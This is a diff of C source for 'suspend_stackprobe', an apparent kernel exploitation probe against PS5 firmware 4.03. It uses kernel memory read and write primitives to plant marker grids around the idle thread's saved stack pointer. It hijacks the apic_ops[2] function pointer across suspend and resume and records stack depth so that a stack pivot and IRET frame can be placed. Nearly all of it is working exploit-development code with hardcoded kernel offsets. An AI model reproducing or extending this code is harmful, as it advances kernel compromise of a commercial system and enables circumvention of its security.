@@ -1,25 +1,32 @@
 #include <stdint.h>
 
 /*
- * suspend_stackprobe v1 — Determine resume stack state for pivot planning
+ * suspend_stackprobe v2 — Determine resume stack state for pivot planning
  *
  * GOAL: Find exactly where RSP is when apic_ops[2] is called during
  * resume, so we can plan the pop_all_iret IRET frame placement.
+ *
+ * v2 CHANGE: Use idle thread's PCB saved RSP (pcb_rsp) to derive the
+ * stack region instead of td_kstack/td_kstack_pages, which return 0
+ * on PS5 FW 4.03 (wrong offsets for Sony's modified FreeBSD).
+ *
+ * The marker grid is centered around pcb_rsp: half above, half below.
+ * This way we catch the actual stack usage during resume regardless of
+ * whether the stack grows further down or stays near the saved RSP.
  *
  * STRATEGY: Two-phase approach.
  *
  * Phase 1 (pre-suspend, runs immediately):
  *   - Read pcpu[0].idlethread->td_pcb->pcb_rsp (saved RSP from last switch)
- *   - Read the idle thread's kernel stack boundaries
- *   - Write a grid of marker qwords across the idle thread's stack
- *     at 64-byte intervals covering the top 2048 bytes
+ *   - Write a grid of marker qwords centered around pcb_rsp
+ *     at 64-byte intervals covering 2048 bytes (1024 above, 1024 below)
  *   - Write markers to kdata_base + 0x200 region (persistence control)
  *   - Set apic_ops[2] to get_timer_freq (safe, survives resume)
  *   - Record all addresses and original values
  *
  * Phase 2 (post-resume, deploy readback payload):
  *   - Use fw_ver=0x2 mode to readback without re-arming
- *   - Read the marker grid from the idle stack
+ *   - Read the marker grid
  *   - Markers overwritten by the resume code reveal the stack region used
  *   - The boundary between intact and clobbered markers shows RSP depth
  *
@@ -34,8 +41,8 @@
  *   [0]   magic "SKPR" (0x534B5052) | status(32)
  *   [1]   kdata_base
  *   [2]   ktext_base
- *   [3]   idle_kstack_base
- *   [4]   idle_kstack_pages
+ *   [3]   idle_pcb_addr
+ *   [4]   idle_pcb_rsp (used as grid center)
  *   [5]   idle_pcb_rsp (saved RSP from last context switch)
  *   [6]   idle_pcb_rip (saved RIP from last context switch)
  *   [7]   marker_grid_start (lowest address with markers)
@@ -93,8 +100,6 @@
 
 /* pcpu / thread / PCB offsets */
 #define PC_IDLETHREAD    0x08
-#define TD_KSTACK        0x2a8
-#define TD_KSTACK_PAGES  0x2b0
 #define TD_PCB           0x3f8
 #define PCB_RSP          0x28
 #define PCB_RIP          0x38
@@ -103,6 +108,8 @@
 #define MARKER_COUNT     32
 #define MARKER_SPACING   64   /* bytes between markers */
 #define GRID_SIZE        (MARKER_COUNT * MARKER_SPACING)  /* 2048 bytes */
+/* Grid is centered on pcb_rsp: half below (lower addr), half above */
+#define GRID_BELOW       (GRID_SIZE / 2)  /* 1024 bytes below pcb_rsp */
 
 /* DR sentinel values */
 #define DR0_SENTINEL     0x5354414B50524F42ULL  /* "STAKPROB" */
@@ -113,6 +120,9 @@
 /* kdata control marker */
 #define KDATA_CTRL_OFF   0x200
 #define KDATA_CTRL_VAL   0x4B44415441435452ULL  /* "KDATACTR" */
+
+/* Minimum valid kernel address — anything below this is suspicious */
+#define MIN_KERN_ADDR    0xFFFF800000000000ULL
 
 typedef struct {
     uint64_t kdata_base;
@@ -145,25 +155,36 @@ static void mode0_arm(uint64_t kdata_base, volatile uint64_t* out, volatile uint
 
     uint64_t pcpu0 = kdata_base + PCPU_ARRAY_OFF;
     uint64_t idlethread = read8(pcpu0 + PC_IDLETHREAD);
-    uint64_t idle_kstack = read8(idlethread + TD_KSTACK);
-    uint64_t idle_pages  = read8(idlethread + TD_KSTACK_PAGES);
-    uint64_t idle_pcb    = read8(idlethread + TD_PCB);
-    uint64_t pcb_rsp     = read8(idle_pcb + PCB_RSP);
-    uint64_t pcb_rip     = read8(idle_pcb + PCB_RIP);
+    uint64_t idle_pcb   = read8(idlethread + TD_PCB);
+    uint64_t pcb_rsp    = read8(idle_pcb + PCB_RSP);
+    uint64_t pcb_rip    = read8(idle_pcb + PCB_RIP);
 
-    uint64_t stack_top = idle_kstack + idle_pages * 4096;
+    /* Safety check: pcb_rsp must be a valid kernel address */
+    if (pcb_rsp < MIN_KERN_ADDR || idle_pcb < MIN_KERN_ADDR) {
+        out32[0] = MAGIC_SKPR;
+        out32[1] = 0xFE;  /* error: invalid pcb_rsp */
+        out[1] = kdata_base;
+        out[2] = idle_pcb;
+        out[3] = pcb_rsp;
+        out[100] = 0xdeadbeefcafe00FEULL;
+        return;
+    }
 
-    /* Marker grid: cover top GRID_SIZE bytes of idle stack */
-    uint64_t grid_start = stack_top - GRID_SIZE;
-    uint64_t grid_end   = stack_top;
+    /* Center marker grid around pcb_rsp:
+     * grid_start = pcb_rsp - 1024 (below saved RSP)
+     * grid_end   = pcb_rsp + 1024 (above saved RSP)
+     * Align grid_start down to 64-byte boundary for clean spacing */
+    uint64_t grid_center = pcb_rsp;
+    uint64_t grid_start = (grid_center - GRID_BELOW) & ~(uint64_t)0x3F;
+    uint64_t grid_end   = grid_start + GRID_SIZE;
 
     /* Header */
     out32[0] = MAGIC_SKPR;
     out32[1] = 0xAAAA;
     out[1] = kdata_base;
     out[2] = ktext_base;
-    out[3] = idle_kstack;
-    out[4] = idle_pages;
+    out[3] = idle_pcb;
+    out[4] = pcb_rsp;
     out[5] = pcb_rsp;
     out[6] = pcb_rip;
     out[7] = grid_start;
@@ -220,10 +241,23 @@ static void mode2_readback(uint64_t kdata_base, volatile uint64_t* out, volatile
 
     uint64_t pcpu0 = kdata_base + PCPU_ARRAY_OFF;
     uint64_t idlethread = read8(pcpu0 + PC_IDLETHREAD);
-    uint64_t idle_kstack = read8(idlethread + TD_KSTACK);
-    uint64_t idle_pages  = read8(idlethread + TD_KSTACK_PAGES);
-    uint64_t stack_top = idle_kstack + idle_pages * 4096;
-    uint64_t grid_start = stack_top - GRID_SIZE;
+    uint64_t idle_pcb   = read8(idlethread + TD_PCB);
+    uint64_t pcb_rsp    = read8(idle_pcb + PCB_RSP);
+
+    /* Same grid calculation as mode0_arm */
+    uint64_t grid_center = pcb_rsp;
+    uint64_t grid_start = (grid_center - GRID_BELOW) & ~(uint64_t)0x3F;
+
+    /* Safety check */
+    if (pcb_rsp < MIN_KERN_ADDR || idle_pcb < MIN_KERN_ADDR) {
+        out32[0] = MAGIC_SKPR;
+        out32[1] = 0xFE;
+        out[1] = kdata_base;
+        out[2] = idle_pcb;
+        out[3] = pcb_rsp;
+        out[100] = 0xdeadbeefcafe00FEULL;
+        return;
+    }
 
     /* Header */
     out32[0] = MAGIC_SKPR;
@@ -231,7 +265,7 @@ static void mode2_readback(uint64_t kdata_base, volatile uint64_t* out, volatile
     out[1] = kdata_base;
     out[2] = ktext_base;
 
-    /* Read back marker grid from idle stack */
+    /* Read back marker grid */
     int first_clobbered = -1;
     int last_clobbered = -1;
 
@@ -282,11 +316,8 @@ static void mode2_readback(uint64_t kdata_base, volatile uint64_t* out, volatile
     /* Read and restore apic_ops[2] */
     out[46] = apic_table[2];  /* current value (should be get_timer_freq) */
 
-    /* Restore original xapic_mode (slot 2 original is at ktext+0x294340) */
-    /* We can identify it: it's the value closest to the other apic_ops entries */
-    /* For safety, read apic_table[18] (set_tpr) which is near xapic_mode */
-    /* Original xapic_mode = ktext + 0x294340, set_tpr = ktext + 0x294348 */
-    /* So original = set_tpr - 8 */
+    /* Restore original xapic_mode: apic_table[18] is set_tpr,
+     * original xapic_mode address = set_tpr - 8 */
     uint64_t set_tpr = apic_table[18];
     uint64_t orig_xapic = set_tpr - 8;
     apic_table[2] = orig_xapic;
